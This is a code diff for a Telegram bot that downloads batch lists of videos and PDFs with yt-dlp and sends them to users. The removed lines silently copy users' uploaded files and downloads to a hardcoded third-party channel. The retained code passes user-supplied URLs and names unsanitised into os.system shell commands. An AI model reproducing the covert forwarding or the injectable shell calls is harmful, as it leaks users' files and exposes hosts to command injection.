@@ -45,7 +45,6 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
-        await bot.send_document(-1001918491159, x)
         await input.delete(True)
         file_name, ext = os.path.splitext(os.path.basename(x))
         credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
@@ -78,11 +77,11 @@ async def account_login(bot: Client, m: Message):
     raw_text = input0.text
     await input0.delete(True)
 
-    await editable.edit("**Enter Batch Name or send c for use default name from text.**")
+    await editable.edit("**Enter Batch Name or send C for use default name from text.**")
     input1: Message = await bot.listen(editable.chat.id)
     raw_text0 = input1.text
     await input1.delete(True)
-    if raw_text0 == 'c':
+    if raw_text0 == 'C':
         b_name = file_name
     else:
         b_name = raw_text0
@@ -162,15 +161,11 @@ async def account_login(bot: Client, m: Message):
                 cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
 
             try:                               
-                Show = f"**Downloading:-**\n\n**Name :-** `{name}\nQuality - {raw_text2}`\n\n**Url :-** `{url}`"
-                prog = await m.reply_text(Show)
                 cc = f"**Vid_id »** {str(count).zfill(3)}\n**Title »** {name1} ({res}) 🇨‌ 🇴‌ 🇻 🇮 🇩.mkv\n**Batch »** {b_name}"
                 cc1 = f"**Vid_id »** {str(count).zfill(3)}\n**Title »** {name1} 🇨‌ 🇴‌ 🇻 🇮 🇩.pdf \n**Batch »**{b_name}"
                 if "drive" in url:
                     try:
                         ka = await helper.download(url, name)
-                        copy = await bot.send_document(chat_id=m.chat.id,document=ka, caption=cc1)
-                        await copy.copy(cha_id = -1001918491159)
                         count+=1
                         os.remove(ka)
                         time.sleep(1)
@@ -183,8 +178,6 @@ async def account_login(bot: Client, m: Message):
                         cmd = f'yt-dlp -o "{name}.pdf" "{url}"'
                         download_cmd = f"{cmd} -R 25 --fragment-retries 25"
                         os.system(download_cmd)
-                        copy = await bot.send_document(chat_id=m.chat.id,document=f'{name}.pdf', caption=cc1)
-                        await copy.copy(chat_id = -1001918491159 )
                         count += 1
                         os.remove(f'{name}.pdf')
                     except FloodWait as e:
@@ -192,6 +185,7 @@ async def account_login(bot: Client, m: Message):
                         time.sleep(e.x)
                         continue
                 else:
+                    prog = await m.reply_text(f"**Downloading:-**\n\n** Video Name :-** `{name}\nQuality - {raw_text2}`\n**link:**`{url}`\n\n")
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
                     await prog.delete(True)
